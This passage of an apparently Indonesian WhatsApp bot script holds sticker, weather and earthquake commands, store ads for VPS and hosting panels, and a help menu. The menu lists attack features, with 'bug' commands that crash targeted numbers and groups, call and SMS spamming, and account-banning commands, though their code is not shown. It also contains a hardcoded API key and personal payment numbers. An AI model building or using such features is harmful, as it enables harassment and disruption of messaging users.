var opt = { packname: "©ItsMeNaufal", author: "NAUFAL-MD" }
ZassTdr.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q){
try {
var linkppuserp = await ZassTdr.profilePictureUrl(sender, 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/c488493756317874ed1b3.jpg'
}
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
 {
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
 "url": linkppuserp
}
},
"text": q,
"replyMessage": {}
 }
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: "©ItsMeNAUFAL", author: "NAUFAL-MD" }
ZassTdr.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${command} text atau reply pesan dengan perintah ${command}`)
}
}
        break
        // main
        case 'cuaca':
if (!q) throw `_Contoh_\n${prefix+command} palembang`
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*

*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
break
case 'gempa' :
{
let gempa = await fetchJson(`https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json`)
let teks =`   『 *"INFO GEMPA TERBARU"* 』\n\n*Tanggal :* "${gempa.Infogempa.gempa.Tanggal}"\n*Jam :* "${gempa.Infogempa.gempa.Jam}"\n*Date Time :* "${gempa.Infogempa.gempa.DateTime}"\n*Kordinat :* "${gempa.Infogempa.gempa.Coordinates}"\n*Lintang :* "${gempa.Infogempa.gempa.Lintang}"\n*Bujur :* "${gempa.Infogempa.gempa.Bujur}"\n*Getaran :* "${gempa.Infogempa.gempa.Magnitude}"\n*Kedalaman :* "${gempa.Infogempa.gempa.Kedalaman}"\n*Wilayah :* "${gempa.Infogempa.gempa.Wilayah}"\n*Potensi :* "${gempa.Infogempa.gempa.Potensi}"\n*Dirasakan :* "${gempa.Infogempa.gempa.Dirasakan}"\n\nSumber : https://data.bmkg.go.id\n\n*Rawrr*`
reply(teks)
}
break
//━━━━━━━━━━━━━━━[ DATABASE MSG ]━━━━━━━━━━━━━━━━━//  
  /*case "addmsg": {
  if (!m.quoted) throw m.reply('Reply Message Yang Ingin Disave Di Database');
  if (!q) return m.reply(`Example : ${prefix + command} nama file`)
  let msgs = global.db.data.database
  if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
  msgs[text.toLowerCase()] = quoted.fakeObj
  m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
  }
  break
  case "delmsg": case "deletemsg": {
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) return m.reply(`'${i.nama}' tidak terdaftar didalam list pesan`)
  delete msgs[text.toLowerCase()]
  m.reply(`Berhasil menghapus '${text}' dari list pesan`)
  }
  break
  case "getmsg": {
  if (!q) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
  ZassTdr.copyNForward(m.chat, msgs[text.toLowerCase()], true)
  }
  break
  case "listmsg": {
  let msgs = JSON.parse(fs.readFileSync('./ZassTdrjs/database/database.json'))
  let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
  let teks = '「 LIST DATABASE 」\n\n'
  for (let i of seplit) {
  teks += `⬡ *Nama List :* ${i.nama}\n\n────────────────────────\n\n`
  }
  m.reply(teks)
  }
break*/

    case "reqvps":{
if (!isCreator) return;
reply(`*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*
Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*
⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
ᴛʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ʙᴜʏɪɴɢ ᴀᴛ ʜʏᴜᴜᴏғғᴄ.`)}
        break
case "reqpanel":{
if (!isCreator) return;
reply(`*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*
Ram : 
Username :
Nomor Wa : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*
⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
ᴅᴏɴᴛ ғᴏʀɢᴇᴛ ᴛᴏ ᴏʀᴅᴇʀ ᴀᴛ ʜʏᴜᴜ ᴏғғᴄ.`)}
        break
case "buyvps": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*VPS atau Virtual Private Server adalah sebuah server yang berada di dalam sebuah jaringan komputer yang terpisah dari server lainnya. VPS memungkinkan pengguna untuk mengakses dan menggunakan server seolah-olah mereka memiliki server fisik sendiri. VPS memiliki kontrol yang sama seperti server fisik, namun dengan biaya yang lebih rendah. VPS juga dapat digunakan untuk menjalankan aplikasi yang memerlukan akses root dan memiliki kontrol penuh atas sistem operasi.*

*READY VPS BY NAUFAL OFFC*

_🚀 1 GB 1 CORE = 10.000_
_🚀 2 GB 2 CORE = 20.000_
_🚀 4 GB 2 CORE = 35.000_
_🚀 8 GB 4 CORE = 55.000_

*_Provider : Digital Ocean_*
*_Bergaransi 20 Hari !_*

*Sosmed Admin :*
_✅WhatsApp : Wa.me/6285643228357
_✅Youtube : https://youtube.com/@Fast4you
_✅Instagram : www.instagram.com/allrecode_`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "buypanel": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*LIST HARGA PANEL*

📮1 GB 30% CPU 5K/1BULAN
📮2 GB 60% CPU 8K/1BULAN
📮3 GB 80% CPU 10K/1BULAN 
📮4 GB 110% CPU 13K/1BULAN
📮5 GB 140% CPU 15K/1BULAN
📮6 GB 170% CPU 20K/1BULAN
📮7 GB 180% CPU 25K/1BULAN
📮8 GB 190% CPU 28K/1BULAN
📮UNLIMITED GB UNLIMITED% CPU 20K/1BULAN`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "jasainstall": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*_JASA INSTAL SERVER PANNEL ( PTERODACTYL )_*

_✎ VPS DARI SAYA_
_✎ DOMAIN DARI SAYA_
_✎ EGG DARI SAYA_
_✎ PASANG THEMA (KHUSUS BUY LIMIT 80GB)_

*HARGA :*
_✅LIMIT 20GB = 25K_
_✅LIMIT 40GB = 35K_
_✅LIMIT 80GB = 50K_
*_✎ REKBER/DIRECT GAS AJA_*

*_🌐DOMAIN BISA REQ :_*
_https://telegra.ph/file/5fa76e78d97f330512795.jpg_
_BEBAS PILIH MAU DOMAIN YG MANA_

_BONUS !_
_FREE SC CREATE PANEL_
_FREE SC PUSH KONTAK_
_FREE SC JAGA GRUP_
_FREE SC STORE (JIKA BUY LIMIT 80GB)_

*_✅BERGARANSI 15 HARI !_*
*_GARANSI AKTIF JIKA :_*
_- VPS MOKAD_
_- DOMAIN EXPIRED_
_- SELEBIHNYA DI LUAR TANGGUNG JAWAB SAYA !_

🗣️ : BG APA GW BISA AKSES VPS NYA?
👤 : NGGA ! CUMA NAUFAL OFFC YANG BISA AKSES VPS NYA!

*_JIKA MINAT CHAT_*
*_Wa.me/6285643228357 (Fast4you)_*`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "listsc": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*SEDIA SCRIPT BOT WA*

- SC PUSH KONTAK : 5K
- SC CREATE DOMAIN : 30K
- SC BUG + PANEL : 15K
- SC PUSH AUTO SAVE : 10K
- SC JAGA GRUP : 10K
- SC CREATE PANEL : 15K
- SC STORE + PANEL : 15K`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "buyscdomain": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*MAU BUY SC DOMAIN?*

*SC AJA : 10K*
*SC + 13 DOMAIN : 20K*

*BEDANYA SC AJA SAMA YG + DOMAIN APAAN BG?*
*SC AJA HARUS BELI APIKEY DOMAIN NYA DULU*
*KALO + DOMAIN TINGGAL PAKE AJA*`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break
case "adminpanel": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*NAUFAL OFFC MENYEDIAKAN :*

*ADMIN PANEL*
*HARGA?*
*CUMA 15K PERBULAN*

*RESELLER PANEL*
*HARGA?*
*CUMA 10K PERBULAN*`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "pay":
case "payment": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*PAYMENT NAUFAL*

DANA : 085640613435
A/n 
OVO : 
A/n : 
QRIS : pm aja
A/n : femesshop

*JANGAN LUPA SS BUKTI TF*`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

case "sosmed": {
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*My Website :*
https://desty.page/MyAllRecode

*My Youtube :*
youtube.com/@Fast4you

*My Instagram :*
www.instagram.com/allrecode_

*My Group Pannel :*
https://chat.whatsapp.com/CjswHxn8Lu7KgVNCyjIpeW`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break
case "linkpanel": {
if (!jangan) return reply(`Jirr Lu Siapa Cokk`)
var menump3 = fs.readFileSync("./ZassTdrjs/vn/halo.mp3");
let documents = [doc1, doc2, doc3, doc4, doc5, doc6];
let docs = pickRandom(documents);
var imgalmn = fs.readFileSync("./llogo.png")
let me = m.sender;
let memek = (`*LINK PANEL BY NAUFAL OFFC :*

*LINKLOG1 ✅: *

*LINKLOG2 ✅: *`)
ZassTdr.sendMessage(m.chat, { 
    document: fs.readFileSync('./ZassTdrjs/doc.pdf'), 
    jpegThumbnail: imgalmn,
    fileName: ucapanWaktu,
    mimetype: docs,
    fileLength: 99999999999999,
    pageCount: "100",
    caption: memek,
      contextInfo: {
               forwardingScore: global.jumhal,
               externalAdReply: {
               containsAutoReply: true,
               mediaType: 1,
               mediaUrl: ppuser,
               renderLargerThumbnail: true,
               showAdAttribution: true,
               sourceUrl: 'https://www.instagram.com/allrecode_',
               thumbnailUrl: ppuser,
               title: `HALO ${pushname}`,
               body: ucapanWaktu}}
         }
     );
ZassTdr.sendMessage(m.chat, {
react: { text: ["⏳"], key: m.key }
        })
}
break

//━━━━━━━━━━━━━━━[ MENUNYA ]━━━━━━━━━━━━━━━━━//  
case 'menu':{
var imgalmn = fs.readFileSync("./llogo.png")
const mark_slebew = '0@s.whatsapp.net'
var footer_nya =`Created by - ${global.namaownernya}`
let menu = (`*┏━◦ Name:* ${m.pushName}
*┣❏◦ Number:* ${sender.split("@")[0]}
*┣❏◦ Owner Number:* ${global.nomerOwner}
*│◦ Owner Name :* ${global.namaownernya}
*◦ Bot Name:* ${global.namabotnya}
*┏━◦ Time:* ${jam}
*┗━◦ Runtime :* ${runtime(process.uptime())} 

– *O W N E R M E N U*
┣❏ ◦ ${prefix}public *mode bacot*
┣❏ ◦ ${prefix}self  *mode bisu*
┣❏ ◦ ${prefix}restseler
┣❏ ◦ ${prefix}listseler
┣❏ ◦ ${prefix}addprem *numbet/@tag*
┣❏ ◦ ${prefix}delprem *number/@tag*
┣❏ ◦ ${prefix}addseler *number/@tag*
┣❏ ◦ ${prefix}delseler *number/@tag*
┣❏ ◦ ${prefix}reqvps *send buyvps format*
┣❏ ◦ ${prefix}reqpanel *send buypanel format*
┣❏ ◦ ${prefix}pushkontak *teks*
┣❏ ◦ ${prefix}pushkontakv2 *teks*
┣❏ ◦ ${prefix}cekidgc *show all id group*
┣❏ ◦ ${prefix}anticall *on/off*
┣❏ ◦ ${prefix}setppbot *image*
┗━ ◦ ${prefix}creategc *namegc*

– *DOMAINMENU*
┏━ ◦ ${prefix}subdomain
┣❏ ◦ ${prefix}addgc
┗━ ◦ ${prefix}delgc

– *G R O U P M E N U*
┏━ ◦ ${prefix}autojpm on/off
┣❏ ◦ ${prefix}welcome *on/off*
┣❏ ◦ ${prefix}antilink *on/off*
┣❏ ◦ ${prefix}hidetag *teks*
┣❏ ◦ ${prefix}tagall *teks*
┣❏ ◦ ${prefix}totag *reply chat*
┣❏ ◦ ${prefix}editinfo *open/close*
┣❏ ◦ ${prefix}setppgc *reply image*
┣❏ ◦ ${prefix}setdeskgc *teks*
┣❏ ◦ ${prefix}setnamegc *teks*
┣❏ ◦ ${prefix}promote *@tag*
┣❏ ◦ ${prefix}demote *@tag*
┣❏ ◦ ${prefix}linkgc
┣❏ ◦ ${prefix}add *number*
┣❏ ◦ ${prefix}kick *@tag*
┣❏ ◦ ${prefix}grup *open/close*
┗━ ◦ ${prefix}mute *on/off*

– *R E S E L L E R M E N U*

┏━ ◦ ${prefix}1gb *name,number*
┣❏ ◦ ${prefix}2gb *name,number*
┣❏ ◦ ${prefix}3gb *name,number*
┣❏ ◦ ${prefix}4gb *name,number*
┣❏ ◦ ${prefix}5gb *name,number*
┣❏ ◦ ${prefix}6gb *name,number*
┣❏ ◦ ${prefix}7gb *name,number*
┣❏ ◦ ${prefix}8gb *name,number*
┗━ ◦ ${prefix}unli *only owner*

– *P A N E L M E N U*

┏━ ◦ ${prefix}addusr *create user*
┣❏ ◦ ${prefix}addsrv *create server*
┣❏ ◦ ${prefix}delusr *delete user*
┣❏ ◦ ${prefix}delsrv *delete server*
┣❏ ◦ ${prefix}suspend *ban server*
┣❏ ◦ ${prefix}unsuspend *unban server*
┣❏ ◦ ${prefix}listadmin *show all admin*
┣❏ ◦ ${prefix}listusr *show all user*
┣❏ ◦ ${prefix}listsrv *show all server*
┗━ ◦ ${prefix}linkpanel *displays panel links*

– *S T I C K E R*

┏━ ◦ ${prefix}tourl *reply image*
┣❏ ◦ ${prefix}toimg *reply sticker*
┣❏ ◦ ${prefix}sticker *reply image*
┣❏ ◦ ${prefix}stickerwm *teks1|teks2*
┗━ ◦ ${prefix}qc *teks*

– *S T A L K E R M E N U*

┏━ ◦ ${prefix}ff *id*
┣❏ ◦ ${prefix}ml *id|zone*
┣❏ ◦ ${prefix}aov *id*
┣❏ ◦ ${prefix}cod *id*
┣❏ ◦ ${prefix}pb *nickname*
┣❏ ◦ ${prefix}ig *username*
┗━ ◦ ${prefix}npm *scrape-primbon*

– *S T O R E M E N U*

┏━ ◦ ${prefix}buypanel 
┣❏ ◦ ${prefix}buyvps
┣❏ ◦ ${prefix}jasainstall
┣❏ ◦ ${prefix}listsc
┣❏ ◦ ${prefix}payment
┣❏ ◦ ${prefix}adminpanel
┣❏ ◦ ${prefix}sosmed
┣❏ ◦ ${prefix}done
┣❏ ◦ ${prefix}proses
┣❏ ◦ ${prefix}batal
┗━ ◦ ${prefix}tunda

– *C E C A N M E N U*

┏━ ◦ ${prefix}randomcecan1
┣❏ ◦ ${prefix}randomcecan2
┣❏ ◦ ${prefix}randomcecan3
┣❏ ◦ ${prefix}randomcecan4
┣❏ ◦ ${prefix}randomcecan5
┣❏ ◦ ${prefix}randomcecan6
┣❏ ◦ ${prefix}randomcecan7
┣❏ ◦ ${prefix}randomcecan8
┣❏ ◦ ${prefix}randomcecan9
┗━ ◦ ${prefix}randomcecan10

– *B U G E M O J I*

┏━ ◦ ${prefix}🌷 *nomor|jumlah*
┣❏ ◦ ${prefix}🐲 *nomor|jumlah*
┣❏ ◦ ${prefix}🐉 *nomor|jumlah*
┣❏ ◦ ${prefix}🌵 *nomor|jumlah*
┣❏ ◦ ${prefix}🎄 *nomor|jumlah*
┣❏ ◦ ${prefix}🌲 *nomor|jumlah*
┣❏ ◦ ${prefix}🌳 *nomor|jumlah*
┣❏ ◦ ${prefix}🌱 *nomor|jumlah*
┣❏ ◦ ${prefix}☠️ *nomor|jumlah*
┣❏ ◦ ${prefix}👻 *nomor|jumlah*
┣❏ ◦ ${prefix}😎 *nomor|jumlah*
┣❏ ◦ ${prefix}🐦 *nomor|jumlah*
┣❏ ◦ ${prefix}😎 *nomor|jumlah*
┗━ ◦ ${prefix}🗿 *nomor|jumlah*

– *B A N N E D M E N U*

┏━ ◦ ${prefix}call *nomor*
┣❏ ◦ ${prefix}spamcall *nomor*
┣❏ ◦ ${prefix}spamsms *nomor*
┣❏ ◦ ${prefix}out *nomor*
┣❏ ◦ ${prefix}verif *nomor*
┣❏ ◦ ${prefix}kenon *nomor*
┣❏ ◦ ${prefix}bannedv1 *nomor*
┣❏ ◦ ${prefix}bannedv2 *nomor*
┣❏ ◦ ${prefix}bannedv3 *nomor*
┣❏ ◦ ${prefix}bannedv4 *nomor*
┣❏ ◦ ${prefix}bannedv5 *nomor*
┗━ ◦ ${prefix}bannedv6 *nomor*

– *U N B A N M E N U*

┏━ ◦ ${prefix}unbannedv1 *nomor*
┣❏ ◦ ${prefix}unbannedv2 *nomor*
┣❏ ◦ ${prefix}unbannedv3 *nomor*
┣❏ ◦ ${prefix}unbannedv4 *nomor*
┗━ ◦ ${prefix}unbannedv5 *nomor*

– *B U G M E N U*

┏━ 「 *BUG NUMBER* 」
┣❏ ◦ ${prefix}gas *nomor|jumlah*
┣❏ ◦ ${prefix}kill *nomor|jumlah*
┣❏ ◦ ${prefix}crash *nomor|jumlah*
┣❏ ◦ ${prefix}shoot *nomor|jumlah*
┣❏ ◦ ${prefix}bugkuy *nomor|jumlah*
┣❏ ◦ ${prefix}duarr *nomor|jumlah*
┣❏ ◦ ${prefix}killyou *nomor|jumlah*
┣❏ ◦ ${prefix}doblekill *nomor|jumlah*
┣❏ ◦ ${prefix}triplekill *nomor|jumlah*
┣❏ ◦ ${prefix}savage *nomor|jumlah*
┣❏ ◦ ${prefix}santet *nomor|jumlah*
┣❏ ◦ ${prefix}danger *nomor|jumlah*
┣❏ ◦ ${prefix}meninggal *nomor|jumlah*
┣❏ ◦ ${prefix}headshot *nomor|jumlah*
┗━ ◦ ${prefix}mati *nomor|jumlah*

┏━ 「 *BUG LINK GROUP* 」
┣❏ ◦ ${prefix}killgc *linkgc|jumlah*
┣❏ ◦ ${prefix}santetgc *linkgc|jumlah*
┣❏ ◦ ${prefix}gcwakwaw *linkgc|jumlah*
┣❏ ◦ ${prefix}togc *linkgc|jumlah*
┣❏ ◦ ${prefix}matigc *linkgc|jumlah*
┣❏ ◦ ${prefix}kuygc *linkgc|jumlah*
┣❏ ◦ ${prefix}attackgc *linkgc|jumlah*
┣❏ ◦ ${prefix}mampusgc *linkgc|jumlah*
┣❏ ◦ ${prefix}gasgc *linkgc|jumlah*
┣❏ ◦ ${prefix}ampasgc *linkgc|jumlah*
┣❏ ◦ ${prefix}bahayagc *linkgc|jumlah*
┣❏ ◦ ${prefix}hatihatigc *linkgc|jumlah*
┣❏ ◦ ${prefix}crashgc *linkgc|jumlah*
┣❏ ◦ ${prefix}stuckgc *linkgc|jumlah*
┗━ ◦ ${prefix}ganasgc *linkgc|jumlah*

┏━ 「 *BUG ID GROUP* 」
┣❏ ◦ ${prefix}buggc *idgc|jumlah*
┣❏ ◦ ${prefix}shootgc *idgc|jumlah*
┣❏ ◦ ${prefix}dorrgc *idgc|jumlah*
┣❏ ◦ ${prefix}attackgc *idgc|jumlah*
┣❏ ◦ ${prefix}meninggalgc *idgc|jumlah*
┣❏ ◦ ${prefix}matigc *idgc|jumlah*
┣❏ ◦ ${prefix}seranggc *idgc|jumlah*
┣❏ ◦ ${prefix}bomgc *idgc|jumlah*
┣❏ ◦ ${prefix}ledakangc *idgc|jumlah*
┣❏ ◦ ${prefix}atomgc *idgc|jumlah*
┣❏ ◦ ${prefix}hancur *idgc|jumlah*
┣❏ ◦ ${prefix}bugzirgc *idgc|jumlah*
┣❏ ◦ ${prefix}stuckgc2 *idgc|jumlah*
┣❏ ◦ ${prefix}baugc *idgc|jumlah*
┗━ ◦ ${prefix}ultigc *idgc|jumlah*`)
ZassTdr.sendMessage(m.chat, {
text: menu,
contextInfo: {
externalAdReply: {
title: namaownernya,
body: 'bodynya',
thumbnailUrl: 'hhttps://telegra.ph/file/c488493756317874ed1b3.jpg',
sourceUrl: "https://chat.whatsapp.com/DylN6U1FOSGJ12A7mTEQU9",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
break
case 'd':
case 'done':{
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 ${namaownernya}
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️`
reply(text_done)
}
break

case 'proses':
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
reply(text_proses)
break

case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
reply(text_trxbatal)
break

case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

